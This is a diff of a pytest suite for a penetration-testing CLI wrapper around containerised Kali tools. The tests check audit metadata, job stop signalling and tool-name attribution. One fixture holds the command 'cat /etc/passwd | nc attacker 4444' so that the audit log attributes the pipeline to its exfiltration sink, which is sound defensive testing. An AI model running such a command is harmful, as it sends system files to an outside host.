@@ -512,7 +512,7 @@ class _FakeClient:
         self.posts.append((endpoint, payload))
         return {"id": 7, "superseded_by_id": None}
 
-    def patch(self, endpoint, payload):
+    def patch(self, endpoint, payload, *, accept_409: bool = False):
         self.patches.append((endpoint, payload))
         return {"id": 7, "status": payload.get("status")}
 
@@ -695,7 +695,12 @@ def test_b1_docker_exec_wrapper_captures_in_container_pid(monkeypatch, fake_enga
     assert argv[3:5] == ["sh", "-c"]
     wrapper = argv[5]
     assert wrapper.startswith("echo $$ > /tmp/aith-pid-"), wrapper
-    assert wrapper.endswith('exec "$@"')
+    # The PID-write race fix wraps the original `echo $$ > pidfile; exec "$@"`
+    # in `&&`/`||` so a failed write logs to stderr and still execs. Both
+    # branches must end in `exec "$@"` so the user command runs either way.
+    assert '&& exec "$@"' in wrapper
+    assert '|| (echo' in wrapper and 'PID write to' in wrapper and 'failed' in wrapper
+    assert wrapper.count('exec "$@"') == 2
     # ``sh`` placeholder makes ``$@`` skip the script-name positional.
     assert argv[6] == "sh"
     assert argv[7:] == ["nmap", "-sV", "10.0.0.1"]
@@ -736,7 +741,9 @@ def test_b1_docker_exec_wrapper_with_strace_keeps_pid_capture(monkeypatch, fake_
     assert "echo $$ > /tmp/aith-pid-" in wrapper
     assert "strace -f -e trace=network,write,unlink" in wrapper
     assert 'exec strace ' in wrapper
-    assert wrapper.endswith('"$@"')
+    # Race-protected wrapper: succeed branch and fallback branch both exec strace.
+    assert wrapper.count('exec strace') == 2
+    assert '|| (echo' in wrapper and 'PID write to' in wrapper
     # Same UUID body in both file paths so the operator can correlate them.
     import re
 
@@ -1006,6 +1013,53 @@ def test_kali_exec_dedup_force_bypasses_check(monkeypatch, fake_engagement):
     assert result.status == "completed"
 
 
+def _kali_exec_with_technique(monkeypatch, fake_engagement, technique: str):
+    """Helper: construct a clean kali_exec call with the requested technique value.
+
+    Returns ``(result, fake_client)``. Used by N10 round-trip tests for the new
+    enum members so each test does not duplicate the setup boilerplate.
+    """
+    kali = _setup_fake_config(monkeypatch, fake_engagement)
+    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
+    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
+    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+    result = kali.kali_exec(
+        ["echo", "smoke"],
+        technique=technique,
+        intent=f"{technique.lower()} smoke",
+        probe_kind="fingerprint",
+        phase="recon",
+        timeout=30,
+        agent_name="operator",
+        engagement_dir=fake_engagement,
+        engagement_key=fake_engagement.name,
+        tool_name="echo",
+    )
+    return result, fake_client
+
+
+def test_kali_exec_accepts_meta_technique(monkeypatch, fake_engagement):
+    """N10 — `META` is accepted on the kali_exec round-trip (operator-side metadata)."""
+    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "META")
+    assert result.status == "completed"
+    assert any(payload.get("technique") == "META" for _ep, payload in fake_client.posts)
+
+
+def test_kali_exec_accepts_health_technique(monkeypatch, fake_engagement):
+    """N10 — `HEALTH` is accepted (runtime health smoke / version probes)."""
+    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "HEALTH")
+    assert result.status == "completed"
+    assert any(payload.get("technique") == "HEALTH" for _ep, payload in fake_client.posts)
+
+
+def test_kali_exec_accepts_log_read_technique(monkeypatch, fake_engagement):
+    """N10 — `LOG-READ` is accepted (reading existing artifacts/log files)."""
+    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "LOG-READ")
+    assert result.status == "completed"
+    assert any(payload.get("technique") == "LOG-READ" for _ep, payload in fake_client.posts)
+
+
 def test_kali_exec_rejects_unknown_technique(monkeypatch, fake_engagement):
     kali = _setup_fake_config(monkeypatch, fake_engagement)
     monkeypatch.setattr(kali, "AssessmentClient", _FakeClient)
@@ -1115,7 +1169,7 @@ def test_job_start_posts_queued_then_marks_running(monkeypatch, fake_engagement)
             self.posts.append((endpoint, payload))
             return {"id": 14, "status": "queued"}
 
-        def patch(self, endpoint, payload):
+        def patch(self, endpoint, payload, *, accept_409: bool = False):
             self.patches.append((endpoint, payload))
             return {
                 "id": 14,
@@ -1177,7 +1231,7 @@ def test_job_stop_patches_killed(monkeypatch, fake_engagement):
         def get(self, endpoint):
             return {"id": 22, "dtach_socket_path": "/tmp/aith-jobs/abc.sock"}
 
-        def patch(self, endpoint, payload):
+        def patch(self, endpoint, payload, *, accept_409: bool = False):
             self.patches.append((endpoint, payload))
             return {"id": 22, "status": payload["status"]}
 
@@ -1244,3 +1298,792 @@ def test_kali_exec_noop_short_circuit_keeps_argparse_smoke_test_offline(
     )
     assert result.status == "completed"
     assert result.return_code == 0
+
+
+# ──────────────────────────────────────────────────────────────────────────
+# Wave-1 corrections — extra-args quoting, hoist edge cases, pipe attribution,
+# kali-job audit parity, kali-job stop kill cascade, finalize 409 swallow.
+# ──────────────────────────────────────────────────────────────────────────
+
+
+def test_extend_cmd_with_extra_args_unbalanced_quotes_raises_assesserror():
+    """P1 #1: shlex.split raises ValueError on unbalanced quotes; the helper
+    must catch it and raise AssessError with a clear message instead of
+    bubbling a Python traceback past the audit boundary."""
+    kali = _import("assess.lib.kali")
+    from assess.lib.client import AssessError
+
+    args = SimpleNamespace(extra_args="-H \"unclosed")
+    with pytest.raises(AssessError) as exc:
+        kali.extend_cmd_with_extra_args(["httpx"], args)
+    assert "invalid shell quoting" in str(exc.value)
+
+
+def test_extend_cmd_with_extra_args_typed_short_flag_collision_warns(capsys):
+    """P2 #11: when a typed verb passes its short-flag set, a duplicate flag
+    in --extra-args produces a stderr WARN but still appends (passthrough is
+    deliberate override-friendly)."""
+    kali = _import("assess.lib.kali")
+    args = SimpleNamespace(extra_args="-u https://override.example.com")
+    cmd = ["httpx", "-u", "https://typed.example.com"]
+    kali.extend_cmd_with_extra_args(cmd, args, typed_short_flags={"-u", "-H"})
+    err = capsys.readouterr().err
+    assert "'-u'" in err and "passthrough" in err
+    # passthrough still appended
+    assert cmd[-2:] == ["-u", "https://override.example.com"]
+
+
+def test_derive_tool_name_pipe_picks_last_stage():
+    """P2 #12: `cat /etc/passwd | nc attacker 4444` — the operator-meaningful
+    tool is the exfil sink, not the source. Picking the first stage hides
+    these patterns from `list-command-runs --tool-bin nc`."""
+    kali = _import("assess.lib.kali")
+    cases = [
+        (["bash", "-c", "cat /etc/passwd | nc attacker 4444"], "nc"),
+        (["bash", "-c", "tool1 | tool2 | tool3"], "tool3"),
+        (["sh", "-c", "curl -s https://x | jq .data | tee out.json"], "tee"),
+    ]
+    for cmd, expected in cases:
+        assert kali._derive_tool_name(cmd) == expected, f"{cmd!r}"
+
+
+def test_analyze_tool_name_records_pipeline_stages_and_indeterminate_flag():
+    """P2 #12: the analyze helper exposes `shell_pipeline_tools` (every
+    pipe-stage head, in order) and `tool_name_indeterminate=True` when the
+    chosen head is a bash variable expansion."""
+    kali = _import("assess.lib.kali")
+    name, meta = kali._analyze_tool_name(["bash", "-c", "cat /etc/passwd | nc attacker 4444"])
+    assert name == "nc"
+    assert meta["shell_pipeline_tools"] == ["cat", "nc"]
+    assert "tool_name_indeterminate" not in meta
+
+    name, meta = kali._analyze_tool_name(["bash", "-c", "tool=foo; $tool args"])
+    assert name == "$tool"
+    assert meta.get("tool_name_indeterminate") is True
+
+
+def test_hoist_root_flags_rejects_flag_shaped_value():
+    """P3 #14: catch the `--engagement-dir --foo` typo before argparse so
+    the operator gets a clear exit message instead of `--foo` silently
+    becoming the engagement directory path."""
+    cli = _import("assess.cli")
+    with pytest.raises(SystemExit) as exc:
+        cli._hoist_root_flags(["kali", "subfinder", "--engagement-dir", "--phase", "recon"])
+    msg = str(exc.value)
+    assert "--engagement-dir" in msg and "looks like a flag" in msg
+
+
+def test_hoist_root_flags_rejects_duplicate_engagement_dir():
+    """P3 #15: two `--engagement-dir` occurrences are an operator mistake;
+    surface it instead of silently letting argparse keep the second value."""
+    cli = _import("assess.cli")
+    with pytest.raises(SystemExit) as exc:
+        cli._hoist_root_flags(
+            ["--engagement-dir", "/tmp/a", "kali", "subfinder", "--engagement-dir=/tmp/b"]
+        )
+    assert "more than once" in str(exc.value)
+
+
+def test_hoist_root_flags_rejects_empty_equals_form():
+    """P3 #14 corollary: `--engagement-dir=` (empty value) is also a typo."""
+    cli = _import("assess.cli")
+    with pytest.raises(SystemExit) as exc:
+        cli._hoist_root_flags(["kali", "subfinder", "--engagement-dir="])
+    assert "empty" in str(exc.value)
+
+
+def test_kali_job_start_validates_audit_metadata_and_resolves_agent(
+    monkeypatch, fake_engagement
+):
+    """P1 #2: `kali job start` argparse must enforce the same audit-flag
+    contract the typed verbs do (technique against TECHNIQUE_ENUM, intent
+    length, probe-kind in PROBE_KIND_ENUM, phase in ALLOWED_PHASES, timeout
+    optional but warned), and it must resolve agent name from $AGENT_NAME
+    when --agent-name is omitted."""
+    cli = _import("assess.cli")
+    kali_jobs = _import("assess.lib.kali_jobs")
+    monkeypatch.setenv("AGENT_NAME", "vulnerability-analyst")
+
+    captured: dict = {}
+
+    def fake_start_job(cmd, *, audit_meta, **kwargs):
+        captured["cmd"] = list(cmd)
+        captured["audit_meta"] = dict(audit_meta)
+        captured["kwargs"] = dict(kwargs)
+        return {"id": 7, "status": "running", "dtach_socket_path": "/tmp/x.sock"}
+
+    mod = _import("assess.commands.kali_job")
+    monkeypatch.setattr(mod, "start_job", fake_start_job)
+
+    cli.main([
+        "--engagement-dir", str(fake_engagement),
+        "kali", "job", "start",
+        "--technique", "RECON",
+        "--intent", "long sweep",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "1200",
+        "--target-host", "x.example.com",
+        "--",
+        "nuclei", "-l", "hosts.txt",
+    ])
+    meta = captured["audit_meta"]
+    assert meta["technique"] == "RECON"
+    assert meta["intent"] == "long sweep"
+    assert meta["probe_kind"] == "fingerprint"
+    assert meta["phase"] == "recon"
+    assert meta["timeout_seconds_requested"] == 1200
+    assert meta["target_host"] == "x.example.com"
+    assert meta["agent_name"] == "vulnerability-analyst"
+    assert captured["kwargs"]["engagement_dir"] == fake_engagement.resolve()
+
+
+def test_kali_job_start_warns_when_timeout_omitted(monkeypatch, fake_engagement, capsys):
+    """P1 #2: --timeout is optional but the helper emits a stderr warn so
+    the operator notices they're using the 24h default."""
+    cli = _import("assess.cli")
+    monkeypatch.setenv("AGENT_NAME", "recon-specialist")
+
+    def fake_start_job(cmd, *, audit_meta, **kwargs):
+        return {"id": 1, "status": "running", "dtach_socket_path": "/tmp/y.sock"}
+
+    mod = _import("assess.commands.kali_job")
+    monkeypatch.setattr(mod, "start_job", fake_start_job)
+
+    cli.main([
+        "--engagement-dir", str(fake_engagement),
+        "kali", "job", "start",
+        "--technique", "RECON",
+        "--intent", "long sweep no timeout",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--",
+        "nuclei", "-l", "hosts.txt",
+    ])
+    err = capsys.readouterr().err
+    assert "timeout" in err.lower() and "24h" in err.lower()
+
+
+def test_kali_job_start_rejects_unknown_technique(monkeypatch, fake_engagement):
+    """P1 #2: argparse choices reject unknown techniques before start_job runs."""
+    cli = _import("assess.cli")
+    monkeypatch.setenv("AGENT_NAME", "recon-specialist")
+    with pytest.raises(SystemExit) as exc:
+        cli.main([
+            "--engagement-dir", str(fake_engagement),
+            "kali", "job", "start",
+            "--technique", "MADE-UP-NOT-IN-ENUM",
+            "--intent", "x",
+            "--probe-kind", "fingerprint",
+            "--phase", "recon",
+            "--timeout", "60",
+            "--",
+            "nuclei",
+        ])
+    assert exc.value.code != 0
+
+
+def test_kali_job_stop_terminates_with_sigterm_then_sigkill(monkeypatch, fake_engagement):
+    """P1 #3: stop must SIGTERM, wait, SIGKILL if needed, and only PATCH
+    `status=killed` once the in-container PID is confirmed dead."""
+    kali_jobs = _import("assess.lib.kali_jobs")
+    monkeypatch.setattr(
+        kali_jobs,
+        "load_config",
+        lambda flag: SimpleNamespace(
+            base_url="http://127.0.0.1:18000",
+            engagement_dir=str(fake_engagement),
+            engagement_key=fake_engagement.name,
+            agent_root=str(fake_engagement.parent.parent),
+        ),
+    )
+
+    class _StopClient(_FakeClient):
+        def get(self, endpoint):
+            return {"id": 22, "dtach_socket_path": "/tmp/aith-jobs/abc.sock"}
+
+        def patch(self, endpoint, payload, *, accept_409: bool = False):
+            self.patches.append((endpoint, payload))
+            return {"id": 22, "status": payload["status"]}
+
+    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
+    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
+    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 9999)
+
+    # PID alive on first three checks (SIGTERM grace), dead on the fourth
+    # (after SIGTERM is delivered for the 4th poll). Mix in a SIGKILL.
+    alive_calls = {"n": 0}
+
+    def fake_alive(container, pid):
+        alive_calls["n"] += 1
+        # After 2 polls under SIGTERM, the process is dead.
+        return alive_calls["n"] <= 2
+
+    monkeypatch.setattr(kali_jobs, "_job_pid_alive", fake_alive)
+
+    signals_sent: list[str] = []
+
+    def fake_signal(container, pid, sig):
+        signals_sent.append(sig)
+
+    monkeypatch.setattr(kali_jobs, "_signal_job_pid", fake_signal)
+    # Avoid sleeping in the poll loop.
+    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)
+
+    record = kali_jobs.job_stop(22, container_name="security-research")
+    assert record["status"] == "killed"
+    assert "TERM" in signals_sent
+    assert ("jobs/22", {"status": "killed"}) in fake_client.patches
+
+
+def test_kali_job_stop_escalates_to_sigkill_when_sigterm_ignored(monkeypatch, fake_engagement):
+    """P1 #3: when SIGTERM doesn't kill the process inside the 10s grace,
+    the helper escalates to SIGKILL."""
+    kali_jobs = _import("assess.lib.kali_jobs")
+    monkeypatch.setattr(
+        kali_jobs,
+        "load_config",
+        lambda flag: SimpleNamespace(
+            base_url="http://127.0.0.1:18000",
+            engagement_dir=str(fake_engagement),
+            engagement_key=fake_engagement.name,
+            agent_root=str(fake_engagement.parent.parent),
+        ),
+    )
+
+    class _StopClient(_FakeClient):
+        def get(self, endpoint):
+            return {"id": 23, "dtach_socket_path": "/tmp/aith-jobs/def.sock"}
+
+        def patch(self, endpoint, payload, *, accept_409: bool = False):
+            self.patches.append((endpoint, payload))
+            return {"id": 23, "status": payload["status"]}
+
+    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
+    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
+    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 4242)
+
+    # Compress the wait loop: signal SIGTERM never lands → keep returning alive
+    # until a SIGKILL is sent, then go dead.
+    state = {"sigkill_sent": False}
+
+    def fake_alive(container, pid):
+        return not state["sigkill_sent"]
+
+    def fake_signal(container, pid, sig):
+        if sig == "KILL":
+            state["sigkill_sent"] = True
+
+    monkeypatch.setattr(kali_jobs, "_job_pid_alive", fake_alive)
+    monkeypatch.setattr(kali_jobs, "_signal_job_pid", fake_signal)
+    # Compress timeouts so the 10s SIGTERM grace doesn't drag the test out.
+    real_monotonic = kali_jobs.time.monotonic
+    fake_clock = {"now": real_monotonic()}
+
+    def fast_monotonic():
+        fake_clock["now"] += 100  # leap forward each call → always past deadline
+        return fake_clock["now"]
+
+    monkeypatch.setattr(kali_jobs.time, "monotonic", fast_monotonic)
+    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)
+
+    record = kali_jobs.job_stop(23, container_name="security-research")
+    assert record["status"] == "killed"
+
+
+def test_kali_job_stop_records_stop_failed_when_sigkill_also_fails(monkeypatch, fake_engagement):
+    """P1 #3: if the process is still alive after SIGKILL the helper PATCHes
+    `status=stop_failed` and surfaces the error to the caller."""
+    kali_jobs = _import("assess.lib.kali_jobs")
+    monkeypatch.setattr(
+        kali_jobs,
+        "load_config",
+        lambda flag: SimpleNamespace(
+            base_url="http://127.0.0.1:18000",
+            engagement_dir=str(fake_engagement),
+            engagement_key=fake_engagement.name,
+            agent_root=str(fake_engagement.parent.parent),
+        ),
+    )
+
+    class _StopClient(_FakeClient):
+        def get(self, endpoint):
+            return {"id": 24, "dtach_socket_path": "/tmp/aith-jobs/zzz.sock"}
+
+        def patch(self, endpoint, payload, *, accept_409: bool = False):
+            self.patches.append((endpoint, payload))
+            return {"id": 24, "status": payload["status"]}
+
+    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
+    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
+    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 9000)
+    monkeypatch.setattr(kali_jobs, "_job_pid_alive", lambda *a, **k: True)
+    monkeypatch.setattr(kali_jobs, "_signal_job_pid", lambda *a, **k: None)
+
+    # Force the wait loop to exit immediately on each call.
+    real_monotonic = kali_jobs.time.monotonic
+    fake_clock = {"now": real_monotonic()}
+
+    def fast_monotonic():
+        fake_clock["now"] += 100
+        return fake_clock["now"]
+
+    monkeypatch.setattr(kali_jobs.time, "monotonic", fast_monotonic)
+    monkeypatch.setattr(kali_jobs.time, "sleep", lambda _: None)
+
+    from assess.lib.client import AssessError
+
+    with pytest.raises(AssessError) as exc:
+        kali_jobs.job_stop(24, container_name="security-research")
+    assert "stop_failed" in str(exc.value)
+    # The PATCH still landed with stop_failed so the operator sees the row.
+    assert ("jobs/24", {"status": "stop_failed"}) in fake_client.patches
+
+
+def test_finalize_409_swallowed_as_success(monkeypatch, fake_engagement):
+    """P1 #4: a 409 from the finalize PATCH is a success signal carrying the
+    canonical row payload — `_patch_finalize` must return that row instead
+    of raising AssessError. The "may need orphan sweep" warning must NOT
+    fire on the 409 path."""
+    kali = _setup_fake_config(monkeypatch, fake_engagement)
+    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
+
+    canonical_row = {
+        "id": 7,
+        "status": "completed",
+        "return_code": 0,
+        "duration_ms": 5000,
+        "noop": True,
+    }
+
+    def fake_patch(endpoint, payload, *, accept_409=False):
+        # Mirror the AssessmentClient contract: when accept_409 is set and
+        # the backend says 409, return the canonical row from `existing`.
+        assert accept_409 is True
+        fake_client.patches.append((endpoint, payload))
+        return {**canonical_row, "finalize_409": True}
+
+    fake_client.patch = fake_patch  # type: ignore[assignment]
+    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
+    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+
+    result = kali.kali_exec(
+        ["nmap", "-sV", "10.0.0.1"],
+        technique="RECON",
+        intent="409 race",
+        probe_kind="fingerprint",
+        phase="recon",
+        timeout=60,
+        agent_name="recon-specialist",
+        engagement_dir=fake_engagement,
+        engagement_key=fake_engagement.name,
+        tool_name="nmap",
+    )
+    assert result.status == "completed"
+
+
+def test_assessment_client_patch_accept_409_returns_canonical_row(monkeypatch):
+    """P1 #4 (client-level): AssessmentClient.patch(accept_409=True) must
+    treat HTTP 409 as success and unwrap `detail.existing` so the caller
+    receives the canonical row."""
+    from assess.lib import client as client_mod
+
+    captured: list = []
+
+    def fake_request(self, method, path, body=None, **kwargs):
+        captured.append((method, path, kwargs))
+        return 409, json.dumps(
+            {
+                "detail": {
+                    "message": "already finalized",
+                    "existing": {
+                        "id": 99,
+                        "status": "completed",
+                        "return_code": 0,
+                        "noop": True,
+                    },
+                }
+            }
+        )
+
+    monkeypatch.setattr(client_mod.AssessmentClient, "_request", fake_request)
+    c = client_mod.AssessmentClient("http://127.0.0.1:18000", "engagement-key")
+    row = c.patch("command-runs/99/finalize", {"status": "completed"}, accept_409=True)
+    assert row["id"] == 99
+    assert row["status"] == "completed"
+    assert row.get("finalize_409") is True
+    assert captured[0][2]["accept_409"] is True
+
+
+def test_pre_exec_wrapper_handles_pid_write_failure(monkeypatch, fake_engagement):
+    """P1 narrowing: the wrapper must succeed-or-log-and-still-exec so a
+    failed pid-file write (ENOSPC / read-only /tmp) doesn't strand the user
+    command. The wrapper shape is `echo $$ > pid && exec "$@" || (echo ...; exec "$@")`."""
+    kali = _setup_fake_config(monkeypatch, fake_engagement)
+    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
+    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
+    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
+
+    captured: dict = {}
+
+    def fake_popen(argv, **kwargs):
+        captured["argv"] = argv
+        return _FakePopen(returncode=0)
+
+    monkeypatch.setattr(kali.subprocess, "Popen", fake_popen)
+
+    kali.kali_exec(
+        ["nmap", "-sV", "10.0.0.1"],
+        technique="RECON",
+        intent="pid-write race fix shape",
+        probe_kind="fingerprint",
+        phase="recon",
+        timeout=30,
+        agent_name="recon-specialist",
+        engagement_dir=fake_engagement,
+        engagement_key=fake_engagement.name,
+        tool_name="nmap",
+    )
+    wrapper = captured["argv"][5]
+    # Both happy and failure paths exec the user command.
+    assert wrapper.count('exec "$@"') == 2
+    assert "&& exec" in wrapper
+    assert "PID write to" in wrapper
+
+
+# ──────────────────────────────────────────────────────────────────────────
+# Wave 2 — methodology + wrapper alignment
+# ──────────────────────────────────────────────────────────────────────────
+
+
+def test_kali_root_help_lists_asnmap():
+    """F3 — `kali asnmap` is a registered typed verb (the SKILL mandates it)."""
+    cli = _import("assess.cli")
+    with pytest.raises(SystemExit):
+        cli.main(["kali", "--help"])
+
+
+def test_required_flag_enforcement_asnmap():
+    """F3 — argparse round-trip: asnmap rejects a call missing the audit lifecycle flags."""
+    cli = _import("assess.cli")
+    with pytest.raises(SystemExit) as exc:
+        cli.main(["kali", "asnmap", "-d", "example.com"])
+    assert exc.value.code != 0
+
+
+def test_asnmap_translates_argv(monkeypatch):
+    """F3 — `kali asnmap -d <domain> -silent -o <file>` lands as `asnmap -d ... -silent -o ...`
+    on the wrapped command argv.
+    """
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    captured: dict = {}
+
+    def fake_kali_exec(cmd, **kwargs):
+        captured["cmd"] = list(cmd)
+        captured["kwargs"] = kwargs
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_asnmap")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "asnmap",
+        "-d", "example.com",
+        "-silent",
+        "-o", "/engagements/x/scans/cidrs.txt",
+        "--technique", "OSINT",
+        "--intent", "ASN→CIDR mapping for example.com",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "300",
+    ])
+    cmd = captured["cmd"]
+    assert cmd[0] == "asnmap"
+    assert "-d" in cmd and "example.com" in cmd
+    assert "-silent" in cmd
+    assert "-o" in cmd and "/engagements/x/scans/cidrs.txt" in cmd
+    assert captured["kwargs"]["tool_name"] == "asnmap"
+
+
+def test_asnmap_requires_target_or_list(capsys):
+    """F3 — asnmap.run rejects calls without -d / -l / -asn / -org. The CLI
+    catches AssessError and exits non-zero; the stderr message names the
+    missing flag set so the operator can fix it."""
+    cli = _import("assess.cli")
+
+    with pytest.raises(SystemExit) as exc:
+        cli.main([
+            "kali", "asnmap",
+            "--technique", "OSINT",
+            "--intent", "missing-target test",
+            "--probe-kind", "fingerprint",
+            "--phase", "recon",
+            "--timeout", "60",
+        ])
+    assert exc.value.code != 0
+    err = capsys.readouterr().err
+    assert "asnmap" in err
+    assert "-d" in err or "-l" in err
+
+
+@pytest.mark.parametrize(
+    "ports_value",
+    ["top-100", "top-1000", "full", "80,443", "22,80,443,8000-8100"],
+)
+def test_nmap_ports_accepts_documented_shapes(monkeypatch, ports_value):
+    """F1 — every `--ports <value>` shape documented in the recon skills must
+    parse cleanly. Skill examples use `top-1000`, `full`, explicit lists, and
+    range syntax; a wrapper that rejects any of these breaks the methodology.
+    """
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    def fake_kali_exec(cmd, **kwargs):
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_nmap")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "nmap-scan",
+        "--target", "10.0.0.1",
+        "--ports", ports_value,
+        "--technique", "RECON",
+        "--intent", f"ports={ports_value} parse smoke",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "600",
+    ])
+
+
+def test_nmap_scan_type_rejects_legacy_pseudo_values():
+    """F1 — `--scan-type top-1000`, `full-tcp`, `udp-top`, `targeted`, `ports-only`
+    were drift values from older skill text. The wrapper restricts `--scan-type`
+    to nmap technique flags (sS/sT/sU/sV/sn). Pseudo-values must fail argparse
+    so the methodology stays honest about which knob is which."""
+    cli = _import("assess.cli")
+    for legacy in ("top-1000", "full-tcp", "udp-top", "targeted", "ports-only"):
+        with pytest.raises(SystemExit):
+            cli.main([
+                "kali", "nmap-scan",
+                "--target", "10.0.0.1",
+                "--scan-type", legacy,
+                "--technique", "RECON",
+                "--intent", "drift-value rejection",
+                "--probe-kind", "fingerprint",
+                "--phase", "recon",
+                "--timeout", "600",
+            ])
+
+
+def test_alterx_estimate_flag_appended(monkeypatch):
+    """F5 — `kali alterx -enrich -estimate` carries the `-estimate` toggle
+    through to the underlying alterx invocation."""
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    captured: dict = {}
+
+    def fake_kali_exec(cmd, **kwargs):
+        captured["cmd"] = list(cmd)
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_alterx")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "alterx",
+        "-l", "/engagements/x/scans/subs_passive.txt",
+        "-enrich",
+        "-estimate",
+        "--technique", "RECON",
+        "--intent", "alterx estimate-first",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "120",
+    ])
+    cmd = captured["cmd"]
+    assert "-estimate" in cmd
+    assert "-en" in cmd  # -enrich shorthand
+
+
+def test_dnsx_timeout_flag_passes_through(monkeypatch):
+    """F6 — `kali dnsx -timeout 5` translates to dnsx `-timeout 5`."""
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    captured: dict = {}
+
+    def fake_kali_exec(cmd, **kwargs):
+        captured["cmd"] = list(cmd)
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_dnsx")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "dnsx",
+        "-l", "/engagements/x/scans/cands.txt",
+        "-rl", "100",
+        "-t", "20",
+        "-retry", "3",
+        "-timeout", "5",
+        "--technique", "RECON",
+        "--intent", "polite-CDN-fronted-target dnsx profile",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "1800",
+    ])
+    cmd = captured["cmd"]
+    assert cmd[0] == "dnsx"
+    # `-timeout 5` for dnsx must appear (NOT collapsed into the audit `--timeout`).
+    idx = cmd.index("-timeout")
+    assert cmd[idx + 1] == "5"
+
+
+def test_cero_input_list_pipes_via_sh_wrapper(monkeypatch):
+    """F4 — `kali cero -l <file>` no longer treats the file as a domain literal.
+    The wrapper pipes the file to cero on stdin via a `sh -c 'cat ... | cero ...'`
+    construction, with the audit row's tool_name still recorded as `cero`."""
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    captured: dict = {}
+
+    def fake_kali_exec(cmd, **kwargs):
+        captured["cmd"] = list(cmd)
+        captured["kwargs"] = kwargs
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_cero")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "cero",
+        "-l", "/engagements/x/scans/target_cidrs.txt",
+        "-p", "443,8443,9443",
+        "--technique", "OSINT",
+        "--intent", "cero file-input pipe",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "600",
+    ])
+    cmd = captured["cmd"]
+    # File-input form lands as `sh -c 'cat <file> | cero ...'`.
+    assert cmd[0] == "sh"
+    assert cmd[1] == "-c"
+    assert "cat /engagements/x/scans/target_cidrs.txt" in cmd[2]
